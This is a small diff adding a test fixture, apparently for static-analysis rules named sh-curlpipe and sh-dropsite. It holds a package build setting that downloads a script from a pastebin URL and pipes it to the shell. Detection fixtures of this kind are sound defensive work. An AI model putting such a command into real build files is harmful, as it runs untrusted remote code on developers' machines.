@@ -1,0 +1,4 @@
+# Fixture only — never executed.
+[package.metadata.example]
+# ruleid: sh-curlpipe sh-dropsite
+build = "curl -s https://pastebin.com/raw/x | sh"
